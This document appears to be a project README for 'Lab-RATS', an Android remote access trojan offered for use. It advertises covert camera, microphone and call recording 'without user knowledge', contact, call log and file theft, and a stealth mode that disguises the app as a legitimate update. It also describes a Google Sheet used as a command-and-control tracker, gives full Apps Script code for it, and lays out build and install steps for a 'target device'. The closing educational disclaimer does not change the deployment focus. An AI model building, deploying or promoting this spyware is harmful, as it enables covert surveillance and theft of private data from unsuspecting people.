![K4N3CO Logo](https://raw.githubusercontent.com/K4N3CO-LABS/Lab-RATS/main/app/src/main/res/drawable/app_logo.png)

## About

**Lab-RATS** is a **Powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a user friendly **web-based interface** and works on the newest updated 2026 Android software. *(SDK 36)*

---

## 🚀 New Features

- **Signed & Unsigned APKs**: Automatically generates both `signed.apk` *(for release)* and `unsigned.apk`.
- **Advanced Identity**: Customize **App Name, Package Name** *(ID)*, and **Min SDK**.
- **Stealth Mode**: Randomly **generates Version Name** and **Version Code** to look like **legitimate updates**.
- **Smart Logo**:
  - **Automatically resizes** any image to all Android densities.
  - Optional **Transparency Generation** *(removes white backgrounds)*.
  - Forces "**Legacy Mode**" to **bypass** adaptive icons on newer Androids.
-   **Live Camera Streaming**: View **real-time camera feed** from both **front and back cameras** directly in your browser.
-   **Background Video Recording**: **Record high-quality video** in the background **without** user knowledge.
-   **Photo Capture**: Take **instant photos** from **any** available camera.
-   **Audio Management**: 
    -   **Live Microphone** Recording.
    -   **Automatic Call** Recording *(Incoming/Outgoing)*.
-   **File Manager**: **Browse, download, and manage files** on the internal and external storage.
-   **Communication Logs**:
    -   **Full Call Log** access.
    -   **Contact list** extraction.
-   **Device Information**: **Detailed** system, network, hardware, and battery status.
-   **Auto-Reporting**: **Automatically sends** device IP and connection links to a **configured Google Sheet**.

---

## Screenshots

**Server App to install on Target Android Phone/Tablet**

<a href='https://postimg.cc/gXn4hBLP' target='_blank'><img src='https://i.postimg.cc/gXn4hBLP/RAT-app-home.jpg' border='0' alt='RAT-app-home'></a> 

**Live Streaming Target Device on Web Server UI from PC**

<a href='https://postimg.cc/TpmYRdw9' target='_blank'><img src='https://i.postimg.cc/TpmYRdw9/Lab-RATS-home.png' border='0' alt='Lab-RATS-home'></a> 
<a href="https://postimg.cc/v1XZp0m0" target="_blank"><img src="https://i.postimg.cc/v1XZp0m0/RATS-device.png" alt="RATS-device"></a> <a href="https://postimg.cc/TyQ3ZtP9" target="_blank"><img src="https://i.postimg.cc/TyQ3ZtP9/RATS-camera.png" alt="RATS-camera"></a> <a href='https://postimg.cc/w1Cr9z1H' target='_blank'><img src='https://i.postimg.cc/w1Cr9z1H/photo-RATS.png' border='0' alt='photo-RATS'></a> <a href="https://postimg.cc/wtFjSwBk" target="_blank"><img src="https://i.postimg.cc/wtFjSwBk/RATS-audio.png" alt="RATS-audio"></a> <a href="https://postimg.cc/06ZyLVNd" target="_blank"><img src="https://i.postimg.cc/06ZyLVNd/RATS-call-logs.png" alt="RATS-call-logs"></a> <a href="https://postimg.cc/8FwzqZCm" target="_blank"><img src="https://i.postimg.cc/8FwzqZCm/RATS-data.png" alt="RATS-data"></a>

---

## 🧠 Direct IPv6 Access

During **security research**, a **fascinating** behavior in **modern Android networking** was discovered. When an Android device **connects to mobile data** *(and many modern WiFi networks)*, it is assigned a **Public IPv6 Address**.

**Unlike** IPv4, which is **heavily NAT'd** *(Network Address Translation)* and requires **complex Port Forwarding** to access from the outside, **IPv6 addresses are often directly routeable on the public internet**.

### How Lab-RATS Exploits This:

1.  **Local HTTP Server**: The app starts a **lightweight HTTP server** on the Android device *(Port 8080)*.
2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the **IP address** into your browser. (**No router config, no firewall bypass, no NGROK**)
3.  **The Problem** *(Dynamic IPs)*: **Mobile** networks **rotate IPs frequently**. Your **target's IP changes** every time they **reconnect**.
4.  **The Solution** *(Google Sheets)*: We use a **simple Google Sheet** as a **"Command & Control" (C2)** tracker. The app **detects** its own **Public IPv6** and **quietly posts** it to your **Google Sheet.** You **open the sheet**, click the **link**, and you are connected **directly to the device**.

> `**We turn the Android phone into a public web server and use Google Sheets as a dynamic phonebook to find it.**`.

---

## 🛠️ Getting Started

### 1. Requirements
-   **Java 11 or 21** installed on your PC.
-   An **Android** device (target).
-   A **Google Sheet URL** for IP reporting.

### 2. Building the APK
1.  **Download** & **extract** the zip file.
2.  **Navigate** to the `k4n3co-builder/` directory.
3.  **Run** the builder **script**:
    -   **Windows**: Double-click `build.bat`
    -   **Linux/Mac**: `chmod +x build.sh` then `./build.sh`
4.  **Follow** the prompts to **configure**:
    -   **Pick** Number 1 to **build the APK**
    -   **App Name**: *(Default: Lab-RATS)*
    -   **Package Name**: *(Default: com.labs.k4n3co)*
    -   **Google Sheet URL**: Paste in your **Apps Script Web App URL** *(Google Sheet set-up instructions below)*.
5.  The **final APK** will be **generated** in `k4n3co-builder/output/`.

### 3. Usage
1.  **Install** the **generated APK** onto the **target device**.
2.  **Open the app** and **grant all** requested **permissions**.
3.  Click **"BYPASS_POWER_LIMITS"** to ensure background **persistence**.
4.  Click **"Initialize Server"**.
5.  The **device IP** will appear in your **Google Sheet**. Open the link to **access the control panel**.

---

## 📊 Google Sheet Setup

1. Create **Google Sheet**
2. **Extensions** → **Apps Script**
3. **Paste** this code in:

```javascript
// Lab-RATS Remote Reporting Script
function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    var data = JSON.parse(e.postData.contents);
    
    var timestamp = new Date();
    var device = data.device;
    var network = data.network;
    var ip = data.ip;
    var port = data.port;
    var link = data.link;
    
    // Add data to the next available row
    sheet.appendRow([timestamp, device, network, ip, port, link]);
    
    return ContentService.createTextOutput("Success").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("Error: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}

// Optional: Run this once to create the header row
function setupSheet() {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  sheet.appendRow(["Timestamp", "Device Model", "Network Type", "IP Address", "Port", "Control Panel Link"]);
  sheet.getRange("A1:F1").setFontWeight("bold").setBackground("#051820").setFontColor("white");
}
```
4. **Deploy** → **Web App** → **Anyone**
5. **Copy URL** → **Paste** into **APK builder** when asked.

---

## ⭐ **Support the Project**

If you find **Lab-RATS** useful, **please** consider giving the project a **Star** ⭐ — it **helps** a lot!

**Feel free** to **open issues** or **submit pull requests**. **Contributions** are **always welcome**!

**Donations** *(optional but greatly appreciated)*

**Bitcoin: (BTC)**

```
bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
```

---

## ⚠️ Disclaimer
This tool is for **educational and authorized security testing purposes only**. The **developers are not responsible** for **ANY misuse or damage** caused by this application. **Please use it responsibly**.

---

© 2026 K4N3CO.LABS
